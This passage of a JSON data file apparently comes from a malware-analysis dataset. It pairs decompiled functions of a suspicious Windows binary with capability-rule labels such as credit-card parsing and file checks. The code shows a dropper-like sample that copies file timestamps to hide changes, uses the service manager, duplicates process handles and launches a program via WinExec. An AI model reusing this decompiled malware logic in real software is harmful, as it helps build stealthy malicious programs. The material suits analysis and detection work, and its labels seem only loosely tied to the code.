puVar18[-5], puVar18[-4]);\n            return uVar7;\n        }\n    }\n    puVar18[-4] = 6;\n    goto code_r0x0040357d;\n}\n",
        "token_count": 8850
    },
    "004036c0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004037d6) overlaps instruction at (ram,0x004037d3)\n// \n\nvoid fcn.004036c0(void)\n\n{\n    char cVar1;\n    int32_t extraout_ECX;\n    int32_t extraout_EDX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    bool bVar2;\n    uint uVar3;\n    \n    fcn.00401450(0x406010, 0xd, 0x410548, 0x11);\n    fcn.00401450(0x406010, 0xd, 0x4107a8, 0x10);\n    bVar2 = false;\n    uVar3 = 0x40371f;\n    fcn.00401450(0x406010, 0xd, 0x4107b8, 0x1a);\n    if ((bVar2) || (!bVar2)) {\n        uVar3 = 10;\n        unaff_EBP = 0x41080c;\n        unaff_ESI = 0xd;\n    }\n    *(extraout_EDX + 0xd) = *(extraout_EDX + 0xd) + (extraout_ECX + 1 >> 8);\n    fcn.00401450(0x406010, unaff_ESI, unaff_EBP, uVar3);\n    fcn.00401450(0x406010, 0xd, 0x410818, 0xb);\n    fcn.00401450(0x406010, 0xd, 0x410824, 8);\n    bVar2 = false;\n    uVar3 = 0x4037bf;\n    fcn.00401450(0x406010, 0xd, 0x41082c, 9);\n    if ((bVar2) || (!bVar2)) {\n        uVar3 = 9;\n    }\n    fcn.00401450(0x406010, 0xd, 0x410838, uVar3);\n    fcn.00401450(0x406010, 0xd, 0x410844, 9);\n    fcn.00401450(0x406010, 0xd, 0x410850, 0xc);\n    fcn.00401450(0x406010, 0xd, 0x410978, 3);\n    fcn.00401450(0x406010, 0xd, 0x41097c, 10);\n    fcn.00401450(0x406010, 0xd, 0x410988, 0x1b);\n    fcn.00401450(0x406010, 0xd, 0x4109a4, 0x12);\n    fcn.00401450(0x406010, 0xd, 0x4109b8, 0x40);\n    fcn.00401450(0x406010, 0xd, 0x4109f8, 0xc);\n    cVar1 = fcn.00401450(0x406010, 0xd, 0x410a04, 0xb);\n    bVar2 = SBORROW1(cVar1, '\\x01');\n    fcn.00401450(0x406010, 0xd, 0x410a10, 4);\n    if ((!bVar2) && (bVar2)) {\n        LOCK();\n    }\n    fcn.00401450(0x406010, 0xd, 0x410a14, 4);\n    fcn.00401450(0x406010, 0xd, 0x410a18, 0xc);\n    fcn.00401450(0x406010, 0xd, 0x410a24, 4);\n    fcn.00401450(0x406010, 0xd, 0x410a28, 9);\n    fcn.00401450(0x406010, 0xd, 0x410a34, 0x16);\n    fcn.00401450(0x406010, 0xd, 0x410a4c, 7);\n    return;\n}\n",
        "token_count": 949
    },
    "004043b0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004043b0(uint arg_8h, uint lpBuffer, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_4h;\n    \n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*0x420a94 != 0) {\n        iVar1 = fcn.004042f0(arg_8h_00);\n        *0x420a94 = iVar1 == 0;\n    }\n    fcn.00402ac0(0, arg_8h_00);\n    if (*0x420a94 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 247
    },
    "004020a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040225f) overlaps instruction at (ram,0x0040225e)\n// \n\nchar * __cdecl fcn.004020a0(int32_t arg_8h)\n\n{\n    char **ppcVar1;\n    char *pcVar2;\n    uchar *puVar3;\n    char cVar4;\n    char *pcVar5;\n    uint32_t *puVar6;\n    char extraout_CL;\n    int32_t iVar7;\n    uint32_t unaff_EBX;\n    uint32_t uVar8;\n    char *unaff_ESI;\n    char *pcVar9;\n    char *unaff_EDI;\n    uint *puVar10;\n    ushort in_SS;\n    bool bVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    char *pcStack611;\n    uint uStack607;\n    uchar *puStack603;\n    uint uStack599;\n    char *pcStack595;\n    char *pcStack591;\n    uchar *puStack587;\n    uchar *puStack583;\n    uint32_t uStack579;\n    uint uStack575;\n    char *pcStack571;\n    uint uStack567;\n    uint uStack563;\n    uint uStack559;\n    uint var_20bh;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack587 = &stack0xfffffffc;\n    puVar10 = &fcn.004020a0::var_20bh;\n    for (iVar7 = 0x7f; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    pcStack595 = puVar10 + 3;\n    *(puVar10 + 2) = 0;\n    iVar7 = fcn.00402480();\n    if (iVar7 == 0) {\n        return NULL;\n    }\n    if (arg_8h == -1) {\n        iVar7 = fcn.004023d0();\n        bVar11 = iVar7 == 0;\n        if (((!bVar11) && (!bVar11)) && (bVar11)) {\n            unaff_ESI = unaff_EDI;\n        }\n    }\n    uStack559 = 1;\n    uStack563 = 0x4107a8;\n    uStack567 = 0x402141;\n    puStack583 = &stack0xfffffdcd;\n    pcStack571 = pcStack595;\n    iVar7 = (**0x420a6c)();\n    if (iVar7 != 0) {\n        return NULL;\n    }\n    uStack575 = *(var_8h + 0x18);\n    var_ch = uStack575;\n    pcStack591 = unaff_ESI;\n    uStack579 = unaff_EBX;\n    while( true ) {\n        uVar8 = uStack579;\n        puVar3 = puStack587;\n        pcVar9 = pcStack591;\n        pcVar2 = pcStack595;\n        uStack567 = *(puStack587 + -0xc);\n        pcStack571 = 0x40218c;\n        uStack575 = (**0x420a74)();\n        pcStack571 = *(puVar3 + 8);\n        puStack583 = puVar3 + -0x20c;\n        uStack579 = 0x4107b8;\n        puStack587 = 0x4021bf;\n        pcStack571 = (*_sym.imp.MSVCRT.dll_sprintf)();\n        bVar11 = (POPCOUNT(&stack0xfffffdc9 & 0xff) & 1U) == 0;\n        if ((bVar11) || (!bVar11)) goto code_r0x004021e6;\n        ppcVar1 = segment(in_SS, *0x10 + -0x237);\n        pcVar5 = *ppcVar1;\n        if (0xffffffef < &stack0xfffffdb9) break;\n        if (!bVar11) {\n            uStack567 = 0xb7bc9ea5;\ncode_r0x004021e6:\n            pcStack571 = NULL;\n            uStack575 = 0;\n            uStack579 = 0;\n            puStack583 = NULL;\n            puStack587 = 0x420a80;\n            pcStack591 = 0x4021f9;\n            pcVar5 = (**0x420a70)();\n            bVar11 = false;\n            bVar12 = pcVar5 != NULL;\n            if (bVar12) {\n                if ((bVar12) && (!bVar12)) {\n                    uVar8 = uVar8 + 1;\n                    pcVar9 = pcVar5;\n                    if (uVar8 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\ncode_r0x00402215:\n                    in_AF = 9 < (pcVar5 & 0xf) | in_AF;\n                    puVar6 = (pcVar5 & 0xffff0000 | CONCAT11((pcVar5 >> 8) + in_AF, pcVar5 + in_AF * '\\x06') & 0xff0f) +\n                             0x2a;\n                    bVar11 = *puVar6 < uVar8;\n                    *puVar6 = *puVar6 - uVar8;\n                    pcVar5 = pcVar9 + 1;\n                }\n                puStack603 = puVar3 + -4;\n                uStack599 = 4;\n                uStack607 = 2;\n                *(puVar3 + -4) = 3000;\n                pcStack611 = pcVar5;\n                puVar6 = (**0x420a68)();\n                if ((bVar11) || (!bVar11)) {\n                    iVar7 = (**0x420a64)(pcVar5, puVar3 + -0x20c, 0, 0, 0x84000000, 0);\n                    if (iVar7 != 0) {\n                        (**0x420a78)(iVar7);\n                        (**0x420a78)(pcVar5);\n                        return 0x1;\n                    }\n                    (**0x420a78)(pcVar5);\n                    return NULL;\n                }\n                pcVar5 = puVar6 + 1;\n                if (&stack0xfffffd9d < *puVar6 || pcVar5 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            return pcVar5;\n        }\n    }\n    cVar4 = pcVar5;\n    *pcVar5 = *pcVar5 + cVar4;\n    *pcVar2 = *pcVar2 + extraout_CL;\n    *pcVar5 = *pcVar5 + cVar4;\n    *(uVar8 + 0x76) = *(uVar8 + 0x76) + cVar4;\n    goto code_r0x00402215;\n}\n",
        "token_count": 1552
    },
    "00402790": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402790(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.004022c0(0x80000002, 0x41073c, 0x410788, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "004045f0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040462d) overlaps instruction at (ram,0x0040462c)\n// \n// WARNING: Removing unreachable block (ram,0x0040462d)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.004045f0(void)\n\n{\n    bool bVar1;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    bVar1 = SBORROW4(&stack0xfffffffc, 0x94);\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if ((!bVar1) && (bVar1)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 251
    },
    "00401260": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401260(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00402c00(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "00402ac0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ac0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char lpBuffer;\n    uint var_22fh;\n    uint var_12ch;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t hFile;\n    \n    lpBuffer = '\\0';\n    var_12ch._0_1_ = 0;\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_12ch + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    hFile = arg_ch;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar6 = &lpBuffer;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar6 = 0x410580;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    puVar5 = &var_12ch;\n    do {\n        puVar8 = puVar5;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        puVar8 = puVar5 + 1;\n        cVar1 = *puVar5;\n        puVar5 = puVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = puVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    if ((arg_ch == -1) && (hFile = fcn.00403b00(arg_8h),  hFile == -1)) {\n        return 0;\n    }\n    iVar2 = hFile;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(hFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1137
    },
    "004012b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040132c) overlaps instruction at (ram,0x00401328)\n// \n\nuint __cdecl fcn.004012b0(uint arg_8h)\n\n{\n    unkbyte10 Var1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    ulong uVar7;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar3 = (**0x420a88)(2, 0);\n    if (iVar3 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar6 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uVar7 = (**0x420a8c)(iVar3, &var_12ch);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    iVar4 = uVar7;\n    Var1 = extraout_ST0;\n    do {\n        if (iVar4 == 0) {\ncode_r0x00401370:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return var_4h;\n        }\n        piVar5 = uVar7 >> 0x20;\n        iVar4 = uVar7;\n        if ((-1 < iVar4) && (-1 >= iVar4)) {\n            *(iVar4 + -0x7ce92414) = Var1;\n            *piVar5 = *piVar5 + -0x7272207c;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar4 = (*pcVar2)(&var_108h, arg_8h);\n        if (iVar4 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00401370;\n        }\n        uVar7 = (**0x420a90)(iVar3, &var_12ch);\n        iVar4 = uVar7;\n        Var1 = extraout_ST0_00;\n    } while( true );\n}\n",
        "token_count": 576
    },
    "004019b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a9b) overlaps instruction at (ram,0x00401a99)\n// \n// WARNING: Removing unreachable block (ram,0x004019e6)\n\nuint32_t fcn.004019b0(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    ulong uVar5;\n    uint var_210h;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    puVar4 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_4h = 0x104;\n    *(puVar4 + 2) = 0;\n    iVar3 = fcn.004022c0(0x80000002, 0x4109b8, 0x4109f8, &var_8h, &var_210h, &var_4h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.MSVCRT.dll__access)(&var_210h, 0);\n    if (iVar3 == -1) {\n        return 0;\n    }\n    uVar5 = fcn.00401850(&var_210h, &var_10ch);\n    pcVar1 = _sym.imp.MSVCRT.dll_strstr;\n    iVar3 = uVar5;\n    if (iVar3 != 0) {\n        if ((-1 < iVar3) && (-1 >= iVar3)) {\n    // WARNING: Could not recover jumptable at 0x00401aa6. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar2 = (**((uVar5 >> 0x20) + 0x11))();\n            return uVar2;\n        }\n        iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(&var_10ch, 0x410a10);\n        if (iVar3 == 0) {\n            iVar3 = (*pcVar1)(&var_10ch, 0x410a14);\n            return iVar3 != 0;\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 569
    },
    "00401b00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d70) overlaps instruction at (ram,0x00401d6f)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00401c70)\n// WARNING: Removing unreachable block (ram,0x00401c7e)\n\nuint fcn.00401b00(int32_t param_1)\n\n{\n    int32_t *arg_ch;\n    uchar *arg_ch_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *extraout_ECX;\n    uchar *arg_8h;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    char extraout_DL;\n    char extraout_DL_00;\n    char extraout_DL_01;\n    uchar *extraout_EDX;\n    uint uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    ushort in_SS;\n    bool bVar8;\n    char cVar9;\n    char cVar10;\n    uint uStack535;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack16;\n    uchar auStack12 [4];\n    uchar auStack8 [4];\n    \n    puVar6 = &stack0xfffffffc;\n    puVar7 = &uStack535;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack276 = 0;\n    puVar7 = &uStack275;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack16 = 1;\n    *(puVar7 + 2) = 0;\n    cVar10 = '\\0';\n    cVar9 = '\\0';\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack276, 0x410568);\n    if ((cVar10 == cVar9) && (cVar10 != cVar9)) {\n        puVar6 = auStack8 + 3;\n        arg_ch_00 = extraout_EDX;\n        arg_8h = extraout_ECX;\n    }\n    else {\n        arg_ch_00 = auStack12;\n        arg_8h = auStack8;\n    }\n    fcn.00401710(arg_8h, arg_ch_00);\n    arg_ch = puVar6[3];\n    iVar3 = fcn.004044a0(param_1, arg_ch, puVar6[4], puVar6[5], puVar6[-1], puVar6[-2]);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    do {\n        *0x420a94 = fcn.004019b0();\n        uVar1 = fcn.004043b0(puVar6 + -0x44, puVar6[-1], puVar6[-2]);\n        bVar8 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;\n        if (uVar1 == 0) {\n            return 0;\n        }\n    } while (((!bVar8) && (bVar8)) && (segment(in_SS, *0x10 + -0x22c),  bVar8));\n    fcn.00404250();\n    iVar3 = fcn.004012b0(0x4105a0);\n    if (iVar3 == -1) {\n        iVar3 = fcn.004012b0(0x410594);\n        if (iVar3 == -1) goto code_r0x00401ced;\n        uVar4 = 0xf;\n    }\n    else {\n        uVar4 = 0xe;\n    }\n    iVar3 = fcn.004029a0(param_1);\n    if (iVar3 != 0) {\n        fcn.00403b50();\n        fcn.004020a0(uVar4);\n        return 1;\n    }\ncode_r0x00401ced:\n    iVar3 = fcn.00402d10(param_1, puVar6 + -0x44);\n    puVar7 = puVar6;\n    if (iVar3 == 0) {\n        puVar6[-3] = 0;\n    }\n    else if (iVar3 == 0) {\n        puVar5 = &stack0xfffffdd0;\n        puVar7 = &stack0xfffffdd0;\n        cVar9 = '\\x10';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar6;\n            cVar9 = cVar9 + -1;\n        } while ('\\0' < cVar9);\n    }\n    iVar3 = extraout_ECX_00;\n    cVar9 = extraout_DL;\n    if ((puVar7[-3] != 0) &&\n       (iVar2 = fcn.00401260(param_1),  iVar3 = extraout_ECX_01,  cVar9 = extraout_DL_00,  iVar2 == 0)) {\n        puVar7[-3] = 0;\n    }\n    iVar2 = puVar7[-3];\n    bVar8 = false;\n    if (iVar2 == 0) {\n        uVar4 = fcn.004010d0(param_1, 0);\n        bVar8 = 0xfffffff7 < &stack0xfffffdcc;\n        puVar7[-3] = uVar4;\n        iVar3 = extraout_ECX_02;\n        cVar9 = extraout_DL_01;\n    }\n    if ((!bVar8) && (bVar8)) {\n        if (iVar3 == 1 || (iVar2 != 0 || *0x10 != 0x22c)) {\n            *arg_ch = param_1 + 4;\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(puVar7 + 0xe) = 0;\n        *(param_1 + -0x18) = *(param_1 + -0x18) + cVar9;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (puVar7[-3] != 0) {\n        fcn.004020a0(0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x4105b4);\n    return puVar7[-3];\n}\n",
        "token_count": 1569
    },
    "004023d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.004023d0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.004022c0(0x80000001, 0x4107d4, 0x410800, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00402350(&var_10ch);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 249
    },
    "00402640": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00402640(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 72
    },
    "004027e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402957) overlaps instruction at (ram,0x00402955)\n// \n// WARNING: Removing unreachable block (ram,0x00402922)\n// WARNING: Removing unreachable block (ram,0x0040290d)\n\nint32_t fcn.004027e0(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint8_t *param_6, \n                    char *param_7)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    char *arg_18h;\n    uint8_t extraout_DL;\n    uint *puVar2;\n    bool bVar3;\n    ulong uVar4;\n    int32_t aiStackY383 [14];\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    fcn.00401df0(param_5, param_6, param_1, 0x20, param_7 + 0x20);\n    fcn.00401df0(param_5, param_6, param_2, 0x20, param_7 + 0x60);\n    bVar3 = (extraout_DL ^ param_6 >> 8 | 0x67) < '\\0';\n    uVar4 = fcn.00401df0(param_5, param_6, param_3, 0x20, param_7 + 0xa0);\n    if ((bVar3) || (!bVar3)) {\n        arg_18h = param_7 + 0xe0;\n    }\n    else {\n        *param_6 = *param_6 & 0xc3;\n        arg_18h = extraout_ECX + -1;\n        *param_7 = *param_7 + param_7;\n        param_4 = uVar4 >> 0x20;\n        param_7 = uVar4 + -0x1bf31dd6;\n    }\n    fcn.00401df0(param_5, param_6, param_4, 0x20, arg_18h);\n    iVar1 = fcn.00402790();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        param_7[0x120] = iVar1 % 5;\n    }\n    else {\n        param_7[0x120] = iVar1;\n    }\n    uStack272 = 0;\n    puVar2 = &uStack271;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    uStack8 = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.004022c0(0x80000001, 0x4107d4, 0x410800, auStack12, &uStack272, &uStack8);\n    bVar3 = iVar1 != 0;\n    if (bVar3) {\n        if ((bVar3) && (!bVar3)) {\n            puVar2[-0x1c] = puVar2[-0x1c] - &stack0xfffffee4;\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&uStack272, 0x410850);\n        if (iVar1 == 0) {\n            param_7[0x120] = param_7[0x120] | 0x80;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 849
    },
    "00403d80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00403d80(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403b00(0x410548);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "004042f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004042f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004012b0(0x4105b4);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 212
    },
    "004049a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
